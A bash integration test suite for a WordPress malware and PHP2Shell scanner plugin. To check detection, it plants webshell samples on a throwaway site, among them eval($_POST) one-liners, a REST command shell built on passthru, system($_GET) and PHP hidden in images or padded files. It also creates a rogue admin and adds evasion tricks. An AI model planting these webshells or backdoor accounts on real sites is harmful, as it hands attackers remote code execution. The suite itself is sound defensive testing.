#!/usr/bin/env bash
#
# Integration tests against a real WordPress install.
#
#   tests/integration.sh /path/to/wordpress
#
# The site must already be installed with this plugin active, and `wp` (WP-CLI)
# must be on PATH (or set WP="php /path/wp-cli.phar"). The script plants inert
# text files that mimic attack indicators, so only run it on a throwaway site.
#
set -uo pipefail

SITE="${1:?usage: integration.sh /path/to/wordpress}"
WP="${WP:-wp} --path=$SITE --allow-root --skip-themes"
C="$SITE/wp-content"
FAIL=0
PASS=0

SECTION=""
section() { SECTION="$1"; echo "== $1 =="; }
ok()   { PASS=$((PASS+1)); echo "  ✓ $1"; }
bad()  {
	FAIL=$((FAIL+1)); echo "  ✗ $1"
	# On GitHub Actions, also raise an annotation (visible without signing in).
	[ -n "${GITHUB_ACTIONS:-}" ] && echo "::error title=Integration test failed::$SECTION — $1"
	return 0
}

# A scan's JSON. Every assertion first checks the scan really produced a report,
# so a crashed scan can't make "hasn't found X" assertions pass by accident.
scan() { $WP php2shell scan --skip-core --format=json --min=info "$@" 2>/dev/null; }
valid() { echo "$1" | jq -e '.verdict and (.findings | type == "array")' >/dev/null 2>&1; }
has() {   # has <json> <jq filter> <label>
	if ! valid "$1"; then bad "$3 (scan produced no report)"; return; fi
	if echo "$1" | jq -e "$2" >/dev/null 2>&1; then ok "$3"; else bad "$3"; fi
}
hasnt() {
	if ! valid "$1"; then bad "$3 (scan produced no report)"; return; fi
	if echo "$1" | jq -e "$2" >/dev/null 2>&1; then bad "$3"; else ok "$3"; fi
}
msg() { echo "[.findings[] | select(.message | test(\"$1\"; \"i\"))] | length > 0"; }
sev() { echo "[.findings[] | select(.severity == \"$1\" and (.message | test(\"$2\"; \"i\")))] | length > 0"; }

# Pretend the website runs this PHP (what the dashboard would record).
set_php() { # set_php <version> [extra] [os] [memory_limit] [history-json] [package] [build-timestamp]
	$WP eval "update_site_option( 'wp2ss_env', array(
		'version' => '$1', 'extra' => '${2:-}', 'branch' => implode( '.', array_slice( explode( '.', '$1' ), 0, 2 ) ),
		'sapi' => 'fpm-fcgi', 'os' => '${3:-linux}', 'server' => 'nginx', 'upload_progress' => '1',
		'memory_limit' => '${4:-256M}', 'fatal_bt' => '0', 'error_log' => '', 'post_max_size' => '8M', 'max_nesting' => '64',
		'pkg' => '${6:-}', 'build' => (int) '${7:-0}', 'time' => time(),
		'history' => json_decode( '${5:-[]}', true ) ) );" >/dev/null 2>&1
}

set_php 8.3.36   # A patched PHP for the baseline tests.

section "1. Clean site"
R=$(scan)
has   "$R" '.verdict' "scan returns a verdict"
if echo "$R" | jq -e '[.findings[] | select(.type=="version" and .severity!="info")] | length > 0' >/dev/null; then
	has "$R" '.verdict == "VULNERABLE"' "unpatched clean site is VULNERABLE (not COMPROMISED)"
	$WP php2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
	[ "$CODE" = "1" ] && ok "exit code 1 when vulnerable" || bad "exit code was $CODE, expected 1"
else
	has "$R" '.verdict == "CLEAN" or .verdict == "REVIEW"' "patched clean site is CLEAN/REVIEW"
fi
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and .type!="version")] | length > 0' "no high/critical findings on a clean install"
hasnt "$R" '[.findings[] | select(.message | test("Scanner"; "i"))] | length > 0' "scanner doesn't flag itself"
hasnt "$R" "$(msg 'Theme \"index.php\"')" "a loose themes/index.php isn't mistaken for a theme"
has   "$R" "$(sev info 'PHP 8.3.36 includes the PHP2Shell fix')" "patched PHP is reported as fixed"

section "2. False-positive bait"
mkdir -p "$C/uploads/2026/08" "$C/cache/wp-rocket/example.com" "$C/plugins/performance-lab" "$C/upgrade-temp-backup/plugins/akismet"
printf '<?php\n// Silence is golden.\n' > "$C/uploads/index.php"
printf '<?php /* nothing here */ ?>\n' > "$C/uploads/2026/08/index.php"
printf '<?php $cache = array(); return $cache;\n' > "$C/cache/wp-rocket/example.com/index-https.php"
printf '<?php\n/**\n * Plugin Name: Performance Lab\n * Author: WordPress Performance Team\n */\n' > "$C/plugins/performance-lab/load.php"
printf '<?php\n/* Plugin Name: Akismet */\n' > "$C/upgrade-temp-backup/plugins/akismet/akismet.php"
printf '<?php\n// Drop-in\n$x = 1;\n' > "$C/object-cache.php"
printf '# BEGIN Wordfence code execution protection\n<IfModule mod_php5.c>\nphp_flag engine 0\n</IfModule>\nAddHandler cgi-script .php .phtml .php3 .pl .py .jsp .asp .htm .shtml .sh .cgi\nOptions -ExecCGI\n# END Wordfence\n' > "$C/uploads/.htaccess"
printf 'auto_prepend_file = "%s/wordfence-waf.php"\n' "$SITE" > "$SITE/.user.ini"
R=$(scan)
hasnt "$R" "$(msg 'uploads/index.php')" "'Silence is golden' index.php in uploads is not flagged"
hasnt "$R" "$(msg 'wp-rocket')" "cache-plugin PHP is not flagged"
hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") and (.message|test("Performance")))] | length > 0' "official Performance Lab plugin is not flagged"
hasnt "$R" "$(msg 'upgrade-temp-backup')" "WordPress's update backup folder is not flagged"
hasnt "$R" "$(msg 'object-cache.php')" "object-cache.php drop-in is not flagged"
hasnt "$R" "$(msg 'htaccess')" "Wordfence's protective uploads .htaccess is not flagged"
hasnt "$R" "$(msg 'before every page')" "Wordfence's auto_prepend_file is not flagged"
rm -rf "$C/plugins/performance-lab" "$C/upgrade-temp-backup" "$C/object-cache.php" "$C/uploads/.htaccess" "$SITE/.user.ini"

section "3. wp2shell indicators"
mkdir -p "$C/plugins/wp2shell_6a5566a6" "$C/plugins/gg-helper" "$C/upgrade/wp2shell_79b06a80" "$C/plugins/cmsmap" "$C/uploads/2026/07"
printf '<?php\n/* Plugin Name: wp2shell_6a5566a6 */\n' > "$C/plugins/wp2shell_6a5566a6/wp2shell_6a5566a6.php"
printf '<?php\n/* Plugin Name: CMSmap */\n' > "$C/plugins/cmsmap/cmsmap.php"
printf "<?php\neval(\$_POST['k']??'http_response_code(404);');\n" > "$C/cache/x.php"
printf "<?php\n/* Plugin Name: gg-helper */\nadd_action('rest_api_init',function(){register_rest_route('morning/v1','/z',array('methods'=>'POST','permission_callback'=>function(){return true;},'callback'=>function(\$r){ob_start();passthru(base64_decode(\$r->get_param('c')).' 2>&1');return ob_get_clean();}));});\n" > "$C/plugins/gg-helper/gg-helper.php"
printf "<?php eval(gzuncompress(base64_decode('AAAA')));\n" > "$C/uploads/2026/07/img.php"
printf 'AddHandler application/x-httpd-php .jpg\n' > "$C/uploads/.htaccess"
printf '<?php echo 1;\n' > "$C/themes/.hidden.php"
touch "$C/temp-write-test-123" "$C/uploads/wp2shell_6a5566a6.zip"
$WP plugin activate gg-helper --quiet
$WP user create backdoor bd@evil.test --role=administrator --quiet >/dev/null 2>&1
$WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>gmdate("Y-m-d H:i:s", time()+7200)), array("user_login"=>"backdoor"));'

LOG=$(mktemp)
cat > "$LOG" <<'EOF'
1.2.3.4 - - [18/Jul/2026:10:00:00 +0000] "POST /?rest_route=%2Fbatch%2Fv1 HTTP/1.1" 207 512 "-" "wp2shell"
34.81.132.62 - - [18/Jul/2026:10:00:05 +0000] "GET /wp-json/wp/v2/users?context=edit HTTP/1.1" 200 10 "-" "Mozilla/5.0"
34.81.132.62 - - [18/Jul/2026:10:00:09 +0000] "POST /wp-admin/update.php?action=upload-plugin HTTP/1.1" 302 0 "-" "Mozilla/5.0"
EOF

R=$(scan --log="$LOG")
has "$R" '.verdict == "COMPROMISED"'           "verdict is COMPROMISED"
has "$R" "$(msg 'wp2shell exploit.s naming')"   "wp2shell_<hex> plugin"
has "$R" "$(msg 'CMSmap')"                      "CMSmap plugin"
has "$R" "$(msg 'hides behind a 404')"          "404 eval one-liner in cache/"
has "$R" "$(sev critical 'gg-helper/gg-helper.php')" "REST command shell (even with a closure permission_callback)"
has "$R" "$(msg 'namespace .morning/v1')"       "morning/v1 namespace registered"
has "$R" "$(msg 'gg-. prefix')"                 "gg- plugin name"
has "$R" "$(msg 'Packed/obfuscated')"           "packed eval in uploads"
has "$R" "$(sev high 'PHP file in a data folder.*uploads/2026/07/img.php')" "recent PHP in uploads is high"
has "$R" "$(msg 'htaccess makes PHP executable')" ".htaccess PHP handler in uploads"
has "$R" "$(msg 'Hidden PHP file')"             "hidden PHP file"
has "$R" "$(sev high 'Write-test file')"        "temp-write-test probe (not WordPress's own naming) is high"
touch "$C/temp-write-test-68348b2b1afa57-55308598"
R2=$(scan)
has "$R2" "$(sev low 'WordPress write-test file left over from 2025-05-26')" "WordPress's own old write-test leftovers are low, not an alarm"
rm -f "$C/temp-write-test-68348b2b1afa57-55308598"
has "$R" "$(msg 'plugin archive')"              "wp2shell_*.zip"
has "$R" "$(msg 'staging folder')"              "upgrade/wp2shell_<hex> folder"
has "$R" '[.findings[] | select(.type=="user" and .severity=="high" and (.message|test("backdoor")))] | length > 0' "rogue admin is high"
has "$R" '[.findings[] | select(.type=="user" and (.message|test("set up")))] | length > 0' "original admin recognised as site setup"
has "$R" "$(msg 'successful .200/207. requests to the WordPress batch API')" "log: URL-encoded batch API hit"
has "$R" "$(msg 'exploit tools')"               "log: tool user-agent"
has "$R" "$(msg 'attacker IPs')"                "log: attacker IP"
has "$R" "$(msg 'plugin-upload')"               "log: plugin upload"
has "$R" "$(msg 'user-enumeration')"            "log: user enumeration"

section "4. Resumable scanning (tiny time slices)"
# Enough files that even a fast machine needs many slices.
mkdir -p "$C/uploads/slices"
for d in $(seq 1 40); do mkdir -p "$C/uploads/slices/$d"; for f in $(seq 1 75); do : > "$C/uploads/slices/$d/f$f.txt"; done; done
FULL=$(echo "$R" | jq '[.findings[] | select(.type!="log")] | length')
SLICED=$($WP eval '
	WP2SS_Scanner::start( array( "core" => false, "log" => "" ), "test", true );
	$steps = 0;
	do { $r = WP2SS_Scanner::step( 0.0005 ); $steps++; } while ( is_array( $r ) && empty( $r["verdict"] ) && $steps < 200000 );
	echo $steps, " ", count( array_filter( $r["findings"], function ( $f ) { return "log" !== $f["type"] && "scan" !== $f["type"]; } ) );
' 2>/dev/null)
FULLNS=$(echo "$R" | jq '[.findings[] | select(.type!="log" and .type!="scan")] | length')
STEPS=${SLICED%% *}; COUNT=${SLICED##* }
[ "${STEPS:-0}" -gt 5 ] && ok "scan resumed across $STEPS slices" || bad "scan did not split into slices ($SLICED)"
[ "$COUNT" = "$FULLNS" ] && ok "sliced scan found the same $COUNT findings" || bad "sliced scan found $COUNT, full scan $FULLNS"
rm -rf "$C/uploads/slices"

section "5. Ignore list & exit codes"
$WP php2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
[ "$CODE" = "2" ] && ok "exit code 2 when compromised" || bad "exit code was $CODE, expected 2"
$WP wp2shell status --format=json >/dev/null 2>&1 && ok "old 'wp wp2shell' command still works" || bad "'wp wp2shell' alias missing"
ID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("Hidden PHP"))][0].id')
$WP php2shell ignore "$ID" >/dev/null
R2=$(scan)
hasnt "$R2" "[.findings[] | select(.id==\"$ID\")] | length > 0" "ignored finding is hidden"
printf '<?php echo 2;\n' > "$C/themes/.hidden.php"
R2=$(scan)
has "$R2" "[.findings[] | select(.id==\"$ID\")] | length > 0" "…but comes back when the file changes"
$WP php2shell ignore "$ID" --undo >/dev/null
# An attacker with database access forges an ignore entry: it must not work.
FID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("hides behind a 404"))][0].id')
$WP eval "update_site_option( 'wp2ss_ignored', array( '$FID' => array( 'sha1' => '', 'sig' => str_repeat( 'a', 64 ), 'by' => 0, 'at' => time() ) ) );" >/dev/null
R2=$(scan)
has "$R2" "[.findings[] | select(.id==\"$FID\")] | length > 0" "forged ignore entry (no valid signature) is rejected"
$WP eval "delete_site_option( 'wp2ss_ignored' );" >/dev/null
has "$($WP php2shell status --format=json 2>/dev/null)" '.verdict' "status command works"

section "6. Evasion & blind spots"
SELF=$($WP eval 'echo untrailingslashit( WP2SS_DIR );' 2>/dev/null)
OUTSIDE=$(mktemp -d)
printf "<?php @eval(\$_REQUEST['z']);\n" > "$SELF/includes/class-helper.php"
mkdir -p "$OUTSIDE/linked-plugin" && printf "<?php eval(\$_POST['q']);\n" > "$OUTSIDE/linked-plugin/x.php"
ln -s "$OUTSIDE/linked-plugin" "$C/plugins/linked-plugin"
ln -s "$C/plugins" "$C/plugins/linked-plugin-loop" 2>/dev/null
mkdir -p "$C/plugins/padded"
{ printf '<?php\n/* Plugin Name: padded */\n'; head -c 6000000 /dev/zero | tr '\0' ' '; printf "\neval(\$_POST['p']);\n"; } > "$C/plugins/padded/padded.php"
printf "<?php \$f=\${'_P'.'OST'}; \$f['a'](\$f['b']);\n" > "$C/plugins/padded/split.php"
printf "<?php eval(base64_decode('%s'));\n" "$(head -c 900 /dev/urandom | base64 -w0)" > "$C/plugins/padded/blob.php"
printf "<?php system(\$_GET['c']);\n" > "$C/plugins/padded/sys.php"
printf "<?php \$_GET['f'](\$_GET['a']);\n" > "$C/plugins/padded/dyn.php"
printf "<?php include 'favicon.ico';\n" > "$C/plugins/padded/ico.php"
BAD=$(printf 'bad\xff\xfename')
mkdir -p "$C/uploads/$BAD" && printf "<?php eval(\$_POST['u']);\n" > "$C/uploads/$BAD/shell.php"
{ printf '\x89PNG\r\n\x1a\n'; printf "<?php eval(\$_POST['i']); ?>"; } > "$C/uploads/2026/07/photo.png"
R=$(scan)
has "$R" "$(msg 'own folder: includes/class-helper.php')" "PHP planted inside the scanner's own folder"
has "$R" "$(msg 'linked-plugin/x.php')"            "webshell in a symlinked plugin folder"
has "$R" '.stats.links >= 1'                        "symlink loop not followed"
has "$R" "$(msg 'padded/padded.php')"              "payload at the end of a >5 MB file"
has "$R" "$(msg 'splitting its name.*split.php')"  "split \$_POST name"
has "$R" "$(msg 'hidden .base64. payload.*blob.php')" "large base64 eval payload"
has "$R" "$(sev critical 'shell commands taken from a web request.*sys.php')" "system(\$_GET[…])"
has "$R" "$(msg 'function whose name comes from a web request.*dyn.php')" "\$_GET['f'](…)"
has "$R" "$(msg 'image file as PHP.*ico.php')"     "include of an image file"
has "$R" "$(msg 'shell.php')"                       "webshell under a non-UTF-8 folder name (scan didn't stall)"
has "$R" "$(msg 'Image file contains PHP code')"   "PHP hidden inside an uploaded image"
rm -f "$SELF/includes/class-helper.php" "$C/plugins/linked-plugin" "$C/plugins/linked-plugin-loop" "$C/uploads/2026/07/photo.png"
rm -rf "$OUTSIDE" "$C/plugins/padded" "$C/uploads/$BAD"

section "7. Host files, site root & stable IDs"
mkdir -p "$C/mu-plugins"
printf '<?php // host\n' > "$C/mu-plugins/kinsta-mu-plugins.php"
printf '<?php // ?\n' > "$C/mu-plugins/zz-unknown.php"
printf '<?php echo 1;\n' > "$C/zz-dropped.php"
printf '<?php echo 1;\n' > "$SITE/.cache.php"
printf 'auto_prepend_file = /tmp/evil.php\n' > "$SITE/.user.ini"
printf '<?php\ndefined( "ABSPATH" ) || exit;\n$a = 1;\n' > "$C/uploads/guarded.php"
touch -d '2024-01-01' "$C/uploads/guarded.php"
R=$(scan)
has "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="low" and (.message|test("kinsta")))] | length > 0' "known host mu-plugin is only low"
has "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="medium" and (.message|test("zz-unknown")))] | length > 0' "unknown mu-plugin is medium"
has "$R" "$(sev high 'directly in wp-content.*zz-dropped.php')" "unknown PHP loose in wp-content"
has "$R" "$(sev high 'Hidden PHP file in the site root')" "hidden PHP in the site root"
has "$R" "$(sev high 'user.ini makes PHP run ./tmp/evil.php')" "malicious auto_prepend_file in .user.ini"
has "$R" "$(sev low 'guarded.php')"               "old, ABSPATH-guarded PHP in uploads is only low"
ID=$(echo "$R" | jq -r '[.findings[] | select(.message|test("zz-unknown"))][0].id')
$WP php2shell ignore "$ID" >/dev/null
touch -d '2026-09-01 12:00' "$C/mu-plugins/zz-unknown.php"
R=$(scan)
hasnt "$R" "$(msg 'zz-unknown')" "ignored finding stays ignored when only its date changes"
$WP php2shell ignore "$ID" --undo >/dev/null
rm -f "$C/mu-plugins/kinsta-mu-plugins.php" "$C/mu-plugins/zz-unknown.php" "$C/zz-dropped.php" "$SITE/.cache.php" "$SITE/.user.ini" "$C/uploads/guarded.php"

section "8. Users & roles"
$WP user create olduser old@test.local --role=subscriber --quiet >/dev/null 2>&1
$WP eval 'global $wpdb; $wpdb->update($wpdb->users, array("user_registered"=>"2020-01-01 00:00:00"), array("user_login"=>"olduser"));'
scan >/dev/null                                    # saves the admin baseline
$WP user set-role olduser administrator --quiet >/dev/null 2>&1
$WP eval '$r = get_role( "editor" ); $r->add_cap( "install_plugins" );' >/dev/null
R=$(scan)
has "$R" "$(sev high 'Existing account .olduser. .* became an administrator')" "old (or backdated) account promoted to admin"
has "$R" "$(sev medium 'role has administrator powers: install_plugins')" "editor role given install_plugins"
$WP eval '$b = get_site_option( "wp2ss_admins" ); $b["ids"][] = 999; update_site_option( "wp2ss_admins", $b );' >/dev/null
R=$(scan)
has "$R" "$(sev high 'saved list of administrators was changed')" "tampered admin baseline is detected"
$WP eval '$r = get_role( "editor" ); $r->remove_cap( "install_plugins" );' >/dev/null
$WP user delete olduser --yes --quiet

section "9. Locking, pauses & cancellation"
OUT=$($WP eval '
	global $wpdb;
	WP2SS_Scanner::start( array( "core" => false ), "test", true );
	$t = is_multisite() ? $wpdb->get_blog_prefix( get_main_site_id() ) . "options" : $wpdb->options;
	$wpdb->query( $wpdb->prepare( "INSERT INTO `$t` (option_name, option_value, autoload) VALUES (%s, %s, %s)", "wp2ss_lock", time() . "|other", "no" ) );
	$a = WP2SS_Scanner::step( 1 );
	echo empty( $a["busy"] ) ? "nobusy" : "busy", " ";
	$wpdb->query( $wpdb->prepare( "UPDATE `$t` SET option_value = %s WHERE option_name = %s", ( time() - 3600 ) . "|dead", "wp2ss_lock" ) );
	$job = get_site_option( "wp2ss_job" ); $job["updated"] = time() - 3 * HOUR_IN_SECONDS; update_site_option( "wp2ss_job", $job );
	do { $b = WP2SS_Scanner::step( 5 ); } while ( is_array( $b ) && empty( $b["verdict"] ) && empty( $b["busy"] ) );
	echo empty( $b["verdict"] ) ? "unfinished" : "finished", " ";
	echo $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM `$t` WHERE option_name = %s", "wp2ss_lock" ) );
' 2>&1)
[ "${OUT%% *}" = "busy" ] && ok "a second request waits while another holds the lock" || bad "lock not respected ($OUT)"
echo "$OUT" | grep -q "finished 0$" && ok "stale lock recovered, paused scan resumed and finished, lock released" || bad "stale lock / resume failed ($OUT)"
OUT=$($WP eval '
	WP2SS_Scanner::start( array( "core" => false ), "test", true );
	WP2SS_Scanner::step( 0.002 );
	WP2SS_Scanner::cancel();
	echo null === WP2SS_Scanner::step( 1 ) && null === WP2SS_Scanner::current() ? "gone" : "back";
' 2>&1)
[ "$OUT" = "gone" ] && ok "a cancelled scan stays cancelled" || bad "cancelled scan came back ($OUT)"

section "10. Error isolation"
cat > "$C/mu-plugins/wp2ss-test-break.php" <<'EOF'
<?php
add_action( 'rest_api_init', function () { throw new RuntimeException( 'simulated crash' ); } );
EOF
R=$(scan)
has "$R" '.verdict' "scan still completes when a check crashes"
has "$R" "$(msg 'stopped early')" "the crash is reported as a finding"
rm -f "$C/mu-plugins/wp2ss-test-break.php"

section "11. WordPress version edge cases"
cat > "$C/mu-plugins/wp2ss-test-version.php" <<'EOF'
<?php $GLOBALS['wp_version'] = '7.0';
EOF
R=$(scan)
has "$R" "$(sev critical 'WordPress 7.0 is vulnerable')" "WordPress \"7.0\" (no .0 suffix) is detected as vulnerable"
rm -f "$C/mu-plugins/wp2ss-test-version.php"

# Core check offline: seed this version's checksums from the files on disk, then check the 7.0 leftovers.
$WP eval '
	$sums = array();
	foreach ( array( "wp-admin", "wp-includes" ) as $d ) {
		$it = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( ABSPATH . $d, FilesystemIterator::SKIP_DOTS ) );
		foreach ( $it as $f ) { $sums[ substr( wp_normalize_path( $f->getPathname() ), strlen( wp_normalize_path( ABSPATH ) ) ) ] = md5_file( $f->getPathname() ); }
	}
	foreach ( glob( ABSPATH . "*.php" ) as $f ) { $sums[ basename( $f ) ] = md5_file( $f ); }
	// As on WordPress 7.1+, whose checksums no longer list the 7.0 collaboration files.
	foreach ( array_keys( $sums ) as $k ) { if ( 0 === strpos( $k, "wp-includes/collaboration/" ) ) { unset( $sums[ $k ] ); } }
	set_site_transient( "wp2ss_core_" . md5( get_bloginfo( "version" ) . "|" . get_locale() ), $sums, HOUR_IN_SECONDS );
' >/dev/null 2>&1
mkdir -p "$SITE/wp-includes/collaboration"; COLLAB_BAK=$(mktemp -d); cp -a "$SITE/wp-includes/collaboration/." "$COLLAB_BAK/" 2>/dev/null
printf "<?php\n/** Official copy (test stand-in). @package WordPress */\ninterface WP_Sync_Storage {}\n" > "$SITE/wp-includes/collaboration/interface-wp-sync-storage.php"
printf "<?php\n/** Not the official file. */\nclass WP_Sync_Post_Meta_Storage {}\n" > "$SITE/wp-includes/collaboration/class-wp-sync-post-meta-storage.php"
H=$(sha1sum "$SITE/wp-includes/collaboration/interface-wp-sync-storage.php" | cut -d' ' -f1)
printf "<?php add_filter( 'wp2ss_signatures', function ( \$s ) { \$s['core_removed']['wp-includes/collaboration/interface-wp-sync-storage.php'][] = '%s'; return \$s; } );\n" "$H" > "$C/mu-plugins/wp2ss-test-core.php"
R=$($WP php2shell scan --format=json --min=info 2>/dev/null)
has "$R" "$(sev low 'Leftover file from WordPress 7.0: wp-includes/collaboration/interface-wp-sync-storage.php')" "official WordPress 7.0 leftovers are low, not 'backdoor'"
if [ -n "$(ls -A "$COLLAB_BAK")" ]; then has "$R" "$(sev low 'Leftover file from WordPress 7.0: wp-includes/collaboration/class-wp-http-polling-sync-server.php')" "the untouched official 7.0 file is recognised by its fingerprint"; fi
has "$R" "$(sev medium 'contents don.t match any official version: wp-includes/collaboration/class-wp-sync-post-meta-storage.php')" "a file using a WordPress 7.0 leftover name with other contents still needs a look"
rm -rf "$SITE/wp-includes/collaboration" "$C/mu-plugins/wp2ss-test-core.php"
if [ -n "$(ls -A "$COLLAB_BAK")" ]; then mkdir -p "$SITE/wp-includes/collaboration"; cp -a "$COLLAB_BAK/." "$SITE/wp-includes/collaboration/"; fi; rm -rf "$COLLAB_BAK"
$WP eval 'delete_site_transient( "wp2ss_core_" . md5( get_bloginfo( "version" ) . "|" . get_locale() ) );' >/dev/null 2>&1

section "12. PHP2Shell: PHP versions"
set_php 8.3.10
R=$(scan)
has "$R" "$(sev high 'PHP 8.3.10 is vulnerable to PHP2Shell')" "8.3.10 (plain upstream build) is vulnerable"
has "$R" '.verdict == "VULNERABLE" or .verdict == "SUSPICIOUS" or .verdict == "COMPROMISED"' "vulnerable PHP raises the verdict"
has "$R" "$(msg 'Temporary PHP2Shell protections.*upload_progress')" "missing stopgap settings are listed"
set_php 8.1.2-1ubuntu2.20 -1ubuntu2.20 ubuntu
R=$(scan)
has "$R" "$(sev medium 'PHP 8.1.2-1ubuntu2.20 has no official PHP2Shell fix')" "Ubuntu-packaged 8.1 is 'ask your host', not a hard fail"
set_php 8.0.30
R=$(scan)
has "$R" "$(sev high 'PHP 8.0.30 has no official PHP2Shell fix')" "8.0 (source backports only) is high"
set_php 7.3.33
R=$(scan)
has "$R" "$(sev critical 'PHP 7.3.33 will never get a PHP2Shell fix')" "7.3 has no fix at all"
hasnt "$R" '.verdict == "COMPROMISED" and ([.findings[] | select(.severity=="critical" and .type!="php")] | length == 0)' "an old PHP alone never reads as COMPROMISED"
set_php 8.5.12
R=$(scan)
has "$R" "$(sev info 'PHP 8.5.12 includes the PHP2Shell fix')" "8.5.12 is fixed"
set_php 8.4.27 "" linux 256M "[{\"v\":\"8.4.20\",\"extra\":\"\",\"sapi\":\"fpm-fcgi\",\"first\":1790000000,\"last\":$(date +%s)}]"
R=$(scan)
has "$R" "$(sev medium 'ran PHP 8.4.20 .not patched for PHP2Shell. until')" "recently-unpatched PHP history prompts credential rotation"

set_php 8.3.6 "" ubuntu 256M "[]" 8.3.6-0ubuntu0.24.04.12
R=$(scan)
has "$R" "$(sev high 'PHP 8.3.6 is vulnerable to PHP2Shell: its operating-system package .8.3.6-0ubuntu0.24.04.12')" "Ubuntu package one build before the fix is vulnerable"
set_php 8.3.6 "" ubuntu 256M "[]" 8.3.6-0ubuntu0.24.04.13
R=$(scan)
has "$R" "$(sev info 'package 8.3.6-0ubuntu0.24.04.13. includes the PHP2Shell fix')" "Ubuntu's fixed package is recognised (same PHP version number)"
set_php 7.4.3 "" ubuntu 256M "[]" 7.4.3-4ubuntu2.29+esm5
R=$(scan)
has "$R" "$(sev info 'package 7.4.3-4ubuntu2.29.esm5. includes the PHP2Shell fix')" "Ubuntu ESM package for PHP 7.4 is recognised as fixed"
set_php 8.1.34 "" linux 256M "[]" "" 1792627200
R=$(scan)
has "$R" "$(sev medium 'was built on 2026-10-22')" "a PHP built after the fix was released is 'probably patched'"

section "13. PHP2Shell: log evidence"
set_php 8.3.36
ERR=$(mktemp)
for i in 1 2 3 4 5 6; do echo "[21-Oct-2026 08:0$i:00 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 65536 bytes) in Unknown on line 0" >> "$ERR"; done
echo "[21-Oct-2026 08:10:00 UTC] PHP Warning:  session_start(): Failed to decode session object. Session has been destroyed in Unknown on line 0" >> "$ERR"
echo "[21-Oct-2026 08:11:00 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted in /var/www/wp-includes/class-wp.php on line 12" >> "$ERR"
echo "[01-Sep-2026 08:00:00 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted in Unknown on line 0" >> "$ERR"
ACC=$(mktemp)
for i in $(seq 1 25); do echo "6.6.6.6 - - [21/Oct/2026:09:00:$(printf %02d $i) +0000] \"POST / HTTP/1.1\" 500 0 \"-\" \"x\"" >> "$ACC"; done
for i in $(seq 1 25); do echo "7.7.7.7 - - [10/Oct/2026:09:00:$(printf %02d $i) +0000] \"POST / HTTP/1.1\" 500 0 \"-\" \"x\"" >> "$ACC"; done
R=$(scan --error-log="$ERR" --log="$ACC")
has   "$R" "$(sev high '^6 out-of-memory errors raised before any script ran')" "burst of 'in Unknown on line 0' OOMs since Oct 17 is high (older one not counted)"
has   "$R" "$(sev medium 'Failed to decode session object')" "session decode failure"
has   "$R" "$(msg 'crashed PHP.*6.6.6.6 .25.')" "POST/500 burst from one IP since Oct 17"
hasnt "$R" "$(msg '7.7.7.7')" "POST/500 burst before Oct 17 ignored"
set_php 8.3.36 "" linux -1
R=$(scan --error-log="$ERR")
has   "$R" "$(sev high 'out-of-memory errors since October 17, 2026 even though memory_limit is -1')" "OOM despite memory_limit=-1 is flagged"
gzip -c "$ERR" > "$ERR.gz"
R=$(scan --error-log="$ERR.gz")
has   "$R" "$(msg 'out-of-memory errors raised before any script ran')" "compressed (.gz) error log works"
# Exploit tools / payload / Amazon-observed addresses; session-decode noise on patched PHP.
P2S=$(mktemp)
echo '5.5.5.5 - - [21/Oct/2026:10:00:00 +0000] "POST /index.php HTTP/1.1" 500 0 "-" "php2shell-scan/109618"' >> "$P2S"
echo '103.216.220.92 - - [21/Oct/2026:11:00:00 +0000] "POST / HTTP/1.1" 200 10 "-" "Mozilla/5.0"' >> "$P2S"
R=$(scan --log="$P2S")
has "$R" "$(sev high 'PHP2Shell exploit tools or their payload')" "PHP2Shell scanner user agent in the access log"
has "$R" "$(sev medium 'addresses seen attempting PHP2Shell')" "Amazon-observed PHP2Shell addresses"
SES=$(mktemp)
echo "[22-Oct-2026 09:00:00 UTC] PHP Warning:  Unknown: Failed to decode session object. Session has been destroyed in Unknown on line 0" > "$SES"
R=$(scan --error-log="$SES")
has "$R" "$(sev info 'Failed to decode session object')" "session-decode noise on patched PHP stays informational (php-src #24493)"
TMPD=$($WP eval 'echo untrailingslashit( sys_get_temp_dir() );' 2>/dev/null)
printf 'not really malware\n' > "$TMPD/nfs"
R=$(scan)
has "$R" "$(sev high 'Suspicious file named .nfs.')" "a file called nfs in the temp folder"
H=$(sha256sum "$TMPD/nfs" | cut -d' ' -f1)
printf "<?php add_filter( 'wp2ss_signatures', function ( \$s ) { \$s['php2shell_files']['%s'] = 'test sample'; return \$s; } );\n" "$H" > "$C/mu-plugins/wp2ss-test-hash.php"
R=$(scan)
has "$R" "$(sev critical 'PHP2Shell malware found')" "known PHP2Shell second-stage hash in the temp folder"
TO=$(mktemp)
echo "[22-Oct-2026 09:10:00 UTC] PHP Fatal error:  Maximum execution time of 30 seconds exceeded in Unknown on line 0" > "$TO"
R=$(scan --error-log="$TO")
has "$R" "$(msg 'Maximum execution time exceeded. errors raised before any script ran')" "time-limit errors before any script ran (CVE-2026-109619 advisory)"
printf '<?php echo 1;\n' > "$TMPD/wp2ss-staged-$$.php"
R=$(scan)
has "$R" "$(sev medium "PHP file in the temporary folder.*wp2ss-staged-$$.php")" "PHP written to the temp folder since the attacks began"
SP=$($WP eval '$p = (string) ini_get( "session.save_path" ); $p = false !== strpos( $p, ";" ) ? substr( $p, strrpos( $p, ";" ) + 1 ) : $p; echo "" !== $p ? $p : sys_get_temp_dir();' 2>/dev/null)
if [ -w "$SP" ] && [ -r "$SP" ] && ls "$SP" >/dev/null 2>&1; then
	printf 'a|s:20:"<?php system($_GET[1]);";' > "$SP/sess_wp2sstest$$"
	R=$(scan)
	has "$R" "$(sev high 'session file.s. contain PHP code')" "PHP code planted in a session file"
	rm -f "$SP/sess_wp2sstest$$"
else
	ok "session-file check skipped (session folder not listable here, as on Debian/Ubuntu)"
fi
